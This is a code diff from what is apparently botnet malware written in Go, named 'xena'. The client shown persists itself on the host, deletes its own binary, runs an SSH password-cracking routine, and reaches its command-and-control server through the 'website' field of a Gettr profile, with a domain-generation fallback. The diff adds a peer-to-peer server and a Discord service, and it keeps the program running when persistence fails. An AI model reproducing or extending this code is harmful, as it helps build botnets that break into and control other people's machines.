@@ -10,6 +10,7 @@ import (
 	"xena/helpers"
 	"xena/modules"
 	"xena/networking"
+	"xena/p2p"
 	"xena/repository"
 	"xena/services"
 
@@ -68,7 +69,7 @@ func tick(host string) bool {
 	}
 
 	for _, message := range messages {
-		reply, err := gateway.InterpretMessage(host, message)
+		reply, err := gateway.InterpretMessage(message)
 		if err != nil {
 			fmt.Println(err)
 			continue
@@ -97,13 +98,11 @@ func initialize() {
 		if !modules.CheckIfPersisted() {
 			err := modules.Persist()
 			fmt.Println(err)
-			return
 		}
 	} else {
 		err := modules.RemoveBinary()
 		if err != nil {
 			fmt.Println(err)
-			return
 		}
 	}
 
@@ -147,6 +146,18 @@ func initialize() {
 			go sshCrackRoutine(config.GatewayHost)
 		}
 	}
+
+	if config.DiscordEnabled {
+		var discord = services.Discord{}
+		err = discord.Init()
+		if err != nil {
+			fmt.Println(err)
+		}
+	}
+
+	// Start the P2P server.
+	var p2p p2p.P2P = p2p.P2P{}
+	go p2p.BootServer(config.PeerPort)
 }
 
 // prepare handles the code executed immediately.
@@ -186,12 +197,14 @@ func main() {
 		}
 
 		// Reachout to Atila (cnc) host via 'website' property on a Gettr profile.
-		gettrGatewayHost, err := services.GettrProfileWebsite(config.GettrProfileName)
-		if err == nil && len(gettrGatewayHost) != 0 {
-			if tick(gettrGatewayHost) {
-				// Reset the timer of DGA and move on...
-				lastContactMade = helpers.TimeSinceJesus()
-				continue
+		if len(config.GettrProfileName) != 0 {
+			gettrGatewayHost, err := services.GettrProfileWebsite(config.GettrProfileName)
+			if err == nil && len(gettrGatewayHost) != 0 {
+				if tick(gettrGatewayHost) {
+					// Reset the timer of DGA and move on...
+					lastContactMade = helpers.TimeSinceJesus()
+					continue
+				}
 			}
 		}
 
